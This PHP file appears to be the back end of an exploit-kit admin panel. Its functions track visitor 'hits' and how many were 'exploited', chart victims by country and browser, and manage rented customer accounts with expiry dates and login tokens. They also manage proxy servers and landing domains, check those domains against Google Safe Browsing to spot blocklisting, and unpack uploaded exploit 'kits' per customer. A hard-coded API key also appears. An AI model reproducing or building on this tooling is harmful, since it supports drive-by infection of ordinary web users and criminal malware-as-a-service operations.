<?php
function total_users() {
    global $dbh;
    $stmt = $dbh->prepare("SELECT count(*) FROM users");
	$stmt->execute();
	return $stmt->fetchColumn(); 
}

function total_hits() {
    global $dbh;
    $stmt = $dbh->prepare("SELECT count( DISTINCT(ip) ) FROM hits WHERE exploited = 0");
	$stmt->execute();
	return $stmt->fetchColumn(); 
}

function total_exploited() {
    global $dbh;
    $stmt = $dbh->prepare("SELECT count(*) FROM hits WHERE exploited = 1");
	$stmt->execute();
	return $stmt->fetchColumn(); 
}

function total_domains() {
    global $dbh;
    $stmt = $dbh->prepare("SELECT count(*) FROM proxy");
	$stmt->execute();
	return $stmt->fetchColumn(); 
}

function count_flows($UserID) {
    global $dbh;
    $stmt = $dbh->prepare("SELECT count(*) FROM flows WHERE user_id = :user_id");
	$stmt->bindParam(':user_id', $UserID, PDO::PARAM_STR);
	$stmt->execute();
	return $stmt->fetchColumn(); 
}

function list_users() {
	global $dbh,$config;
    $stmt = $dbh->prepare("SELECT * FROM users");
	$stmt->execute();
	$users = $stmt->fetchAll();
	foreach ($users as $user) {

		$flowsList = '<ul style="font-size:10px;">';
		$stmt = $dbh->prepare('SELECT * FROM flows WHERE user_id = ?');
		$stmt->execute(array($user['id']));
		while ($thread = $stmt->fetchObject()) {
			$flowsList .= "<li>".$thread->id."</li>";
		}
		$flowsList .= '</ul>';

		$stmt = $dbh->prepare("SELECT count( DISTINCT(ip) ) FROM hits WHERE owner = ? AND exploited = 0");
		$stmt->execute(array($user['id']));
		$hits = $stmt->fetchColumn();

		$stmt = $dbh->prepare("SELECT count(*) FROM hits WHERE owner = ? AND exploited = 1");
		$stmt->execute(array($user['id']));
		$exploited = $stmt->fetchColumn();
		if($user['last_login'] == 0){
			$last_login = "Not logged in.";
		}else{
			$last_login = date('F j, Y, g:i a', $user['last_login']);
		}
		$row = '
                                        <tr>
                                            <td>'.$user['name'].'</td>
                                            <td>'.$user['token'].' [<a href="'.$config['main']['url'].'login.php?t='.$user['token'].'">Login Link</a>]</td>
                                            <td>'.date('F j, Y, g:i a', $user['expiration']).'</td>
					<td>'.count_flows($user['id']).$flowsList.'</td>
                                            <td>'.$last_login.'</td>
                                            <td>'.$user['last_ip'].'</td>
                                            <td>'.$exploited.'/'.$hits.'</td>
                                            <td>'.htmlentities($user['comment']).'</td>
                                        </tr> 
		';
		echo $row;
	}
    return 0;
}


function list_domains() {
	global $dbh;
	$stmt = $dbh->prepare("SELECT * FROM domains");
	$stmt->execute();
	$doms = $stmt->fetchAll();
	foreach ($doms as $dom) {
		$row = '
			<tr>
			<td>'.$dom['name'].'</td>
			<td>
			<input id="d'.$dom['id'].'" name="domain[]" value="'.$dom['id'].'" type="checkbox">
			</td>
			</tr> 
		';
		echo $row;
	}
	return 0;
}
function remove_domains($domains) {
	global $dbh;
    
	foreach($domains as $domain){
		$stmt = $dbh->prepare('DELETE FROM domains WHERE id = ?');
		$stmt->execute(array($domain));
	}
	return 0;
}
function create_mass_domain($lists) {
	$lists = explode("\n",$lists);
	foreach($lists as $domain) {
		$ret = create_domain($domain);
		if(!$ret) {
			$errors = $ret;
			return false;
		}
	}
	return true;
}
function create_domain($name) {
	global $dbh;
	if ($name === '') {
		$errors[] = 'insert name of domain, name not null';
	}
	if (empty($errors)) {
		$stmt = $dbh->prepare("INSERT INTO domains (name) VALUES (?)");
		$stmt->execute(array($name));
		return true;
	} else {
		return $errors;
	}
}


function list_hits() {
	global $dbh;
    $stmt = $dbh->prepare("SELECT owner, browser, referrer, country, city FROM hits WHERE exploited = 0 ORDER BY id DESC LIMIT 200");
	$stmt->execute();
	$hits = $stmt->fetchAll();
	foreach ($hits as $hit) {
		$stmt = $dbh->prepare("SELECT name FROM users WHERE id = ?");
		$stmt->execute(array($hit['owner']));
		$owner = $stmt->fetchColumn();
		$row = '
                                        <tr>
                                            <td>'.$owner.'</td>
                                            <td><img style="margin-bottom:5px;" src="static/img/flags/flags_famfamfam/'.strtolower($hit['country']).'.png" /> '.$hit['country'].'</td>
                                            <td>'.htmlspecialchars($hit['city']).'</td>
                                            <td>'.$hit['browser'].'</td>
                                            <td>'.$hit['referrer'].'</td>
                                        </tr> 
		';
		echo $row;
	}
    return 0;
}

function check_token($token) {
	if ($_SESSION['csrf'] === $token) {
		return true;
	} else {
		return false;
	}
}

function is_post() {
	if ($_SERVER['REQUEST_METHOD'] == 'POST') {
		return true;
	} else {
		return false;
	}
}

function delete_user($name) {
	global $dbh;
    $stmt = $dbh->prepare("SELECT id FROM users WHERE name = ?");
	$stmt->execute(array($name));
	$exist = $stmt->rowCount();

	if ($exist < 1) {
		$errors[] = 'Username doesn\'t exist';
	}

	if (empty($errors)) {
		$id = $stmt->fetchColumn();

		$stmt = $dbh->prepare("DELETE FROM users WHERE id = ?");
		$stmt->execute(array($id));
		$stmt = $dbh->prepare("DELETE FROM domains WHERE owner = ?");
		$stmt->execute(array($id));
		$stmt = $dbh->prepare("DELETE FROM files WHERE owner = ?");
		$stmt->execute(array($id));
		$stmt = $dbh->prepare("DELETE FROM scans WHERE owner = ?");
		$stmt->execute(array($id));
	}
}

function random_str($length = 10){
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function create_user($name, $password, $password2, $expiration, $flows) {
	global $dbh;
	// bullshit and old af
	// $expiration = strtotime($expiration);
	$d = DateTime::createFromFormat('d/m/Y', $expiration);
	$expiration = $d->getTimestamp();
	$stmt = $dbh->prepare("SELECT count(*) FROM users WHERE name = ?");
	$stmt->execute(array($name));
	$exist = $stmt->fetchColumn();

	if (!ctype_alnum($name) || strlen($name) < 5 || strlen($name) > 20) {
		$errors[] = 'Username must be alphanumeric and between 5 and 20 chars.';
	}

	if ($exist > 0) {
		$errors[] = 'Username already exist';
	}

	if ($password != $password2) {
		$errors[] = 'Password verification failed.';
	}

	if (strlen($password) < 8) {
		$errors[] = 'Password must be at least 8 chars.';
	}

	if (time() > $expiration) {
		$errors[] = 'Expiration must be bigger than current time.';
	}
	
	if(!is_numeric($flows) || $flows <= 0 || $flows != round($flows, 0)){
		$errors[] = 'Flows must be a valid number.';
	}
	
	if ($flows > 99) {
		$errors[] = 'Flows cant be bigger than 99.';
	}

//////////////////////////////////////////////////////////////////////////
	if (empty($errors)) {
		$token = random_str(rand(10,15));
		$uid = hash("crc32",$token);
		$stmt = $dbh->prepare("INSERT INTO users (name, pwd, registered, expiration, uid, token) VALUES (?, ?, ?, ?, ?, ?)");
		$stmt->execute(array($name, password_hash($password, PASSWORD_DEFAULT), time(), $expiration, $uid,$token));
		$stmt = $dbh->prepare("SELECT id FROM users WHERE name = ?");
		$stmt->execute(array($name));
		$UserID = $stmt->fetch( PDO::FETCH_ASSOC );
		for ($x = 1; $x <= $flows; $x++) {
		  create_flow($UserID['id']);
		}
		return true;
	} else {
		return $errors;
	}
}

function create_flow($UserID){
	global $dbh;
	$stmt = $dbh->prepare("INSERT INTO flows (user_id, file_id, last_token) VALUES (?, ?, ?)");
	$stmt->execute(array($UserID, "0",time()));
}
////////////////////////////////////////////////////////////////////////////
function change_pwd($name, $password, $password2) {
	global $dbh;
    $stmt = $dbh->prepare("SELECT id FROM users WHERE name = ?");
	$stmt->execute(array($name));
	$exist = $stmt->rowCount();

	if ($exist < 1) {
		$errors[] = 'Username doesn\'t exist';
	}

	if ($password != $password2) {
		$errors[] = 'Password verification failed.';
	}

	if (strlen($password) < 8) {
		$errors[] = 'Password must be at least 8 chars.';
	}

	if (empty($errors)) {
		$pwd = password_hash($password, PASSWORD_DEFAULT);
		$id = $stmt->fetchColumn();

		$stmt = $dbh->prepare("UPDATE users SET pwd = ? WHERE id = ?");
		$stmt->execute(array($pwd, $id));

	}
}

function change_exp($name, $expiration) {
	global $dbh;
	$ad = explode("/", $expiration);
	$expiration = strtotime($ad[1]."/".$ad[0]."/".$ad[2]);
	$stmt = $dbh->prepare("SELECT id FROM users WHERE name = ?");
	$stmt->execute(array($name));
	$exist = $stmt->rowCount();

	if ($exist < 1) {
		$errors[] = 'Username doesn\'t exist';
	}

	if ($expiration < time()) {
		$errors[] = 'Expiration must be bigger than current time.';
	}

	if (empty($errors)) {
		$id = $stmt->fetchColumn();

		$stmt = $dbh->prepare("UPDATE users SET expiration = ? WHERE id = ?");
		$stmt->execute(array($expiration, $id));

	}

}

function change_token($name, $t) {
	global $dbh;
	$expiration = strtotime($expiration);
	$stmt = $dbh->prepare("SELECT id FROM users WHERE name = ?");
	$stmt->execute(array($name));
	$exist = $stmt->rowCount();
	if ($exist < 1) {
		$errors[] = 'Username doesn\'t exist';
	}
	if (empty($errors)) {
		$id = $stmt->fetchColumn();
		$stmt = $dbh->prepare("UPDATE users SET token = ? WHERE id = ?");
		$stmt->execute(array($t, $id));
	}
}


function change_uid($name, $uid) {
	global $dbh;
	$expiration = strtotime($expiration);
	$stmt = $dbh->prepare("SELECT id FROM users WHERE name = ?");
	$stmt->execute(array($name));
	$exist = $stmt->rowCount();

	if ($exist < 1) {
		$errors[] = 'Username doesn\'t exist';
	}

	if (strlen($uid) < 6) {
		$errors[] = 'UID must be at least 6 chars.';
	}

	if (empty($errors)) {
		$id = $stmt->fetchColumn();

		$stmt = $dbh->prepare("UPDATE users SET uid = ? WHERE id = ?");
		$stmt->execute(array($uid, $id));

	}

}

function users_result_parser(){
	if($type == "create"){
		if($result === true){
			return notification_box("success","Proxy server successfully added");
		}else{
			return notification_box("danger","There was an error adding the proxy server");
		}
	}elseif($type == "delete"){
		if($result === true){
			return notification_box("success","Proxy server successfully removed");
		}else{
			return notification_box("danger","There was an error while removing the proxy server");
		}
	}elseif($type == "changepwd"){
	
	}elseif($type == "changeexp"){
	
	}elseif($type == "changetoken"){
	
	}elseif($type == "upload"){
	
	}
}
function load_percentage() {
	global $config;
	$usage = sys_getloadavg();
	return round($usage[2]*100/$config['misc']['cores'], 2);
}

function disk_percentage() {
	return round((disk_total_space('.')-(disk_free_space('.'))*100)/disk_total_space('.'), 2)+100;
}

function get_server_memory_usage(){

    $free = shell_exec('free');
    $free = (string)trim($free);
    $free_arr = explode("\n", $free);
    $mem = explode(" ", $free_arr[1]);
    $mem = array_filter($mem);
    $mem = array_merge($mem);
    $memory_usage = $mem[2]/$mem[1]*100;

    return (int)$memory_usage;
}

function countries() {
	global $dbh;
	$stmt = $dbh->prepare('SELECT country, count( DISTINCT(ip) ) AS magnitude FROM hits WHERE exploited = 0 GROUP BY country ORDER BY magnitude DESC LIMIT 10');
	$stmt->execute();
	$countries = $stmt->fetchAll();
	$i = 1;

	foreach ($countries as $country) {
		echo '						<tr>
                                      <td>'.$i.'</td>
                                      <td><img src="static/img/flags/flags_iso/48/'.strtolower($country['country']).'.png" height="20" width="20"> <b>'.$country['country'].'</b> </td>
                                      <td>'.$country['magnitude'].'</td>
                                    </tr>';
        $i++;
	}
}

function morris_browser_donut() {
	global $dbh;
	$stmt = $dbh->prepare('SELECT browser, count( DISTINCT(ip) ) AS magnitude FROM hits WHERE exploited = 0 GROUP BY browser ORDER BY magnitude DESC LIMIT 10');
	$stmt->execute();
	$browsers = $stmt->fetchAll();

	foreach ($browsers as $browser) {
		echo '{ label: "'.$browser['browser'].'", value: '.$browser['magnitude'].' },';
	}
}

function domain_check_safebrowsing($domain) {
	$safebrowsing = "https://sb-ssl.google.com/safebrowsing/api/lookup?client=api&apikey=ABQIAAAAebbr-o7R7M_9g_NBgR8_jRTSjqJ1VY9Sq54WTTHRjlBGrv8n-g&appver=1.0&pver=3.0&url=".$domain; 
	$safebrowsing = file_get_contents($safebrowsing);
    
    if (preg_match("/phish/", $safebrowsing ) || preg_match("/malware/", $safebrowsing ) || preg_match("/unwanted/", $safebrowsing ) || preg_match("/phishing/", $safebrowsing)) {
        return '<font color="red">Detected</font>';
    } else {
        return '<font color="green">Clean</font>';
	}
}

function domains_server_exist() {
	global $dbh;
	$stmt = $dbh->prepare('SELECT COUNT(*) FROM proxy');
	$stmt->execute();
	$exist = $stmt->fetchColumn();
	if ($exist > 0) {
		return true;
	} else {
		return false;
	}
}

function proxy_server_exist() {
	global $dbh;
	$stmt = $dbh->prepare('SELECT COUNT(*) FROM vds');
	$stmt->execute();
	$exist = $stmt->fetchColumn();
	if ($exist > 0) {
		return true;
	} else {
		return false;
	}
}

function domains_server_show() {
	global $dbh;
	$stmt = $dbh->prepare('SELECT * FROM proxy');
	$stmt->execute();
	$proxies = $stmt->fetchAll();
	foreach ($proxies as $proxy) {
		if(empty($proxy['description'])){
			$desc = "No Description";
		}else{
			$desc = $proxy['description'];
		}
		$date = new DateTime();
		$date->setTimestamp($proxy['last_check']);
		$last_check = $date->format('Y-m-d H:i:s');
		echo '						<tr>
                                      <td>'.$proxy['url'].'</td>
									  <td>'.$desc.'</td>
                                      <td>'.$last_check.'</td>
									  <td class="text-center"><input id="cb'.$proxy['id'].'" type="checkbox" name="domains[]" value="'.$proxy['id'].'" /></td>
                                    </tr>';
	}
}

function domains_server_add($domain,$desc = "N/A") {
	global $dbh;
    global $config;
	/*
	if (!filter_var($domain, FILTER_VALIDATE_URL) === false) {
	} else {
		$errors[] = "Invalid URL provided: ".$domain;
	}
	*/
    if (empty($errors)) {
    	$sql   = "INSERT INTO proxy (url,last_check,description) VALUES (:url,:last_check,:description)";
        $stmt  = $dbh->prepare($sql);
        $stmt->bindParam(':url', $domain, PDO::PARAM_STR);
		$stmt->bindParam(':last_check', time(), PDO::PARAM_STR);
		$stmt->bindParam(':description', $desc, PDO::PARAM_STR);
        $stmt->execute();
    	return true;
    } else {
    	return $errors;
    }
}

function proxy_server_show() {
	global $dbh;
	$stmt = $dbh->prepare('SELECT * FROM vds');
	$stmt->execute();
	$proxies = $stmt->fetchAll();
	foreach ($proxies as $proxy) {
		if($proxy['description'] == "N/A" || empty($proxy['description'])){
			$desc = "No Description";
		}else{
			$desc = $proxy['description'];
		}
		echo '						<tr>
                                      <td>'.$proxy['id'].'</td>
									  <td>'.$proxy['ip'].'</td>
                                      <td>'.$desc.'</td>
                                    </tr>';
	}
}

function proxy_server_dropdown(){
	global $dbh;
	$stmt = $dbh->prepare('SELECT * FROM vds');
	$stmt->execute();
	$r = '<div class="form-group"><select name="vds_id" class="form-control input-lg"><option value="">-Select Proxy-</option>';
	while($proxy = $stmt->fetch( PDO::FETCH_ASSOC )){ 
		$r .= '<option value="'.$proxy['id'].'">'.$proxy['ip'].'</option>';                 
	}
	$r .= ' </select></div>';
	return $r;
}

function proxy_server_remove($proxy) {
	global $dbh;
    global $config;
    $stmt = $dbh->prepare('SELECT count(*) FROM vds WHERE id = ?');
    $stmt->execute(array($proxy));
    $exist = $stmt->fetchColumn();

    if ($exist < 0) {
    	$errors[] = 'Proxy not found.';
    }

    if (empty($errors)) {
    	$stmt = $dbh->prepare('DELETE FROM vds WHERE id = ?');
    	$stmt->execute(array($proxy));
    	return true;
    } else {
    	return $errors;
    }
}

function proxy_server_add($proxy,$desc = "N/A") {
	global $dbh;
    global $config;
	$errors = null;
    if (empty($errors)) {
    	$sql   = "INSERT INTO vds (ip,description) VALUES (:ip,:description)";
        $stmt  = $dbh->prepare($sql);
        $stmt->bindParam(':ip', $proxy, PDO::PARAM_STR);
		$stmt->bindParam(':description', $desc, PDO::PARAM_STR);
        $stmt->execute();
    	return true;
    } else {
    	return $errors;
    }
}

function proxy_result_parser($type,$result){
	if($type == "add"){
		if($result === true){
			return notification_box("success","Proxy server successfully added");
		}else{
			return notification_box("danger","There was an error adding the proxy server");
		}
	}elseif($type == "remove"){
		if($result === true){
			return notification_box("success","Proxy server successfully removed");
		}else{
			return notification_box("danger","There was an error while removing the proxy server");
		}
	}
}

function domains_result_parser($type,$result){
	if($type == "add"){
		if($result === true){
			return notification_box("success","Domain successfully added");
		}else{
			return notification_box("danger","There was an error adding the domain");
		}
	}elseif($type == "mass_add"){
		$r = null;
		foreach($result as $k=>$v){
			if($v === true){
				$r .= notification_box("success","Domain successfully added: ".$k);
			}else{
				$r .= notification_box("danger","There was an error adding the domain: ".$k);
			}
		}
		return $r;
	}elseif($type == "remove"){
		if($result === true){
			return notification_box("success","Domain successfully removed");
		}else{
			return notification_box("danger","There was an error while removing the domain");
		}
	}
}

function notification_box($type,$msg){
	return '<div class="alert alert-'.$type.' alert-dismissable">
                <button type="button" class="close" data-dismiss="alert" aria-hidden="true">×</button>
                '.$msg.'
			</div>';
}

function domains_server_add_mass($domains) {
	global $dbh;
    global $config;
	$text = trim($domains);
	$textAr = explode("\n", $text);
	$textAr = array_filter($textAr, 'trim'); // remove any extra \r characters left behind
	$r = array();
	foreach ($textAr as $domain) {
		$r[$domain] = domains_server_add($domain);
	} 
	return $r;
}

function domains_server_remove($domains) {
	global $dbh;
    global $config;
    
	foreach($domains as $domain){
		$stmt = $dbh->prepare('DELETE FROM proxy WHERE id = ?');
    	$stmt->execute(array($domain));
	}
	
	foreach($domains as $domain){
		$stmt = $dbh->prepare('SELECT count(*) FROM proxy WHERE id = ?');
		$stmt->execute(array($domain));
		$exist = $stmt->fetchColumn();
		if ($exist > 0) {
			$errors[] = 'Domain not deleted.';
		}
	}
	if(count($errors) > 0){
		return $errors;
	}else{
		return true;
	}
}

function rrmdir($dir) { 
   if (is_dir($dir)) { 
     $objects = scandir($dir); 
     foreach ($objects as $object) { 
       if ($object != "." && $object != "..") { 
         if (filetype($dir."/".$object) == "dir") rrmdir($dir."/".$object); else unlink($dir."/".$object); 
       } 
     } 
     reset($objects); 
     rmdir($dir); 
   } 
} 

function upload_kit($name, $kit) {
	global $dbh;
    global $config;
    $stmt = $dbh->prepare("SELECT id FROM users WHERE name = ?");
	$stmt->execute(array($name));
	$exist = $stmt->rowCount();

	if ($exist < 1) {
		$errors[] = 'Username doesn\'t exist';
	}

	if (empty($errors)) {
		$stmt = $dbh->prepare("SELECT uid FROM users WHERE name = ?");
		$stmt->execute(array($name));
		$uid = $stmt->fetchColumn();
		$dir = 'e/'.$uid;

		if (file_exists($dir))
			rrmdir('e/'.$uid);

		mkdir($dir);

		$zipArchive = new ZipArchive();
		$result = $zipArchive->open($kit['file']['tmp_name']);
		if ($result === TRUE) {
    		$zipArchive ->extractTo($dir);
    		$zipArchive ->close();
			return true;
		} else {
    		return $errors;
		}
	}
}

function clear_stats() {
	global $dbh;
    $stmt = $dbh->prepare("DELETE FROM hits");
	$stmt->execute();
}

function clear_users() {
	global $dbh;
    $stmt = $dbh->prepare("DELETE FROM users");
	$stmt->execute();
}

function clear_scans() {
	global $dbh;
    $stmt = $dbh->prepare("DELETE FROM scans");
	$stmt->execute();
}

function clear_files() {
	global $dbh;
    $stmt = $dbh->prepare("DELETE FROM files");
	$stmt->execute();
}

function clear_domains() {
	global $dbh;
    $stmt = $dbh->prepare("DELETE FROM proxy");
	$stmt->execute();
}

function clear_exploit() {

}

function nuke() {
	clear_stats();
	clear_scans();
	clear_files();
	clear_users();
	clear_domains();
	clear_exploit();
	return true;
}
?>
